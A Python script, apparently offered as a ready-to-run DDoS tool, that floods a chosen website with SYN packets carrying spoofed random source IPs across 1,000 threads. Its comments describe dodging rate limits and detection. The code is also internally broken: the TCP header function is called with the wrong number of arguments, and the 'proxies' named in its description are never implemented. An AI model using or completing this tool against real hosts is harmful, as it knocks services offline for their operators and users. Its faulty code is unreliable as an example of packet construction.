import socket
import random
import threading
import struct
import time
import argparse


# Random IP Spoofing
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Random port generator to make it harder to block specific port ranges
def random_port():
    return random.randint(1024, 65535)

# Generate a random TCP sequence number
def random_seq():
    return random.randint(0, 4294967295)

# Generate a random TCP window size
def random_window_size():
    return random.randint(1024, 65535)

# Create a fake/custom IP header
def create_ip_header(source_ip, dest_ip):
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            69,  # Version and header length (IPv4, 5 * 32 bits = 20 bytes)
                            0,   # Type of service
                            40,  # Total length
                            random.randint(0, 65535),  # Identification
                            0,   # Flags and Fragment Offset
                            255, # Time to live
                            socket.IPPROTO_TCP,  # Protocol
                            0,   # Header checksum (leave as 0, calculated by kernel)
                            socket.inet_aton(source_ip),  # Source IP
                            socket.inet_aton(dest_ip))    # Destination IP
    return ip_header

# Create a TCP header with SYN flag set
def create_tcp_header(source_port, dest_port):
    tcp_header = struct.pack('!HHLLBBHHH',
                            source_port,  # Source port
                            dest_port,    # Destination port
                            random_seq(),  # Sequence number
                            0,            # Acknowledgment number
                            80,           # Data offset and Reserved (TCP Header length)
                            2,            # Flags (SYN flag set)
                            random_window_size(),  # Window size
                            0,            # Checksum (leave as 0, calculated by kernel)
                            0)            # Urgent pointer
    return tcp_header


# SYN Flood Attack with IP Spoofing and randomized packet structure
def syn_flood(target_ip, target_port):
    while True:
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            # Spoofed source IP
            source_ip = random_ip()
            dest_ip = target_ip
            # Random source port to avoid rate-limiting on a fixed port
            source_port = random_port()
            # Create IP and TCP headers
            ip_header = create_ip_header(source_ip, dest_ip)
            tcp_header = create_tcp_header(source_ip, dest_ip, source_port, target_port)
            # Packet = IP header + TCP header
            packet = ip_header + tcp_header
            # Send the SYN packet
            s.sendto(packet, (dest_ip, 0))
            print(f"Sent SYN packet from {source_ip}:{source_port} to {dest_ip}:{target_port}")
            # Randomize the delay between packets (anti-rate limiting)
            time.sleep(random.uniform(0.1, 1.5))  # Add delay between 0.1 to 1.5 seconds to avoid detection
        except Exception as e:
            print(f"Error: {e}")

# Function to resolve domain to IP using nslookup
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror as e:
        print(f"Could not resolve domain {domain}: {e}")
        return None

# Main function to run the attack
def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description='Perform SYN Flood DDoS attack with IP Spoofing and Proxies.')
    parser.add_argument('-u', '--url', type=str, required=True, help='Target website URL')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default is 80 for HTTP)')
    args = parser.parse_args()

    # Resolve the target domain to IP
    target_ip = resolve_domain(args.url)
    if not target_ip:
        print(f"Error: Could not resolve the target URL: {args.url}")
        return
    print(f"Resolved {args.url} to IP: {target_ip}")

    # Launch multiple threads for more attack intensity
    threads = 1000  # Increase for higher load
    for _ in range(threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port))
        thread.start()

if __name__ == "__main__":
    main()
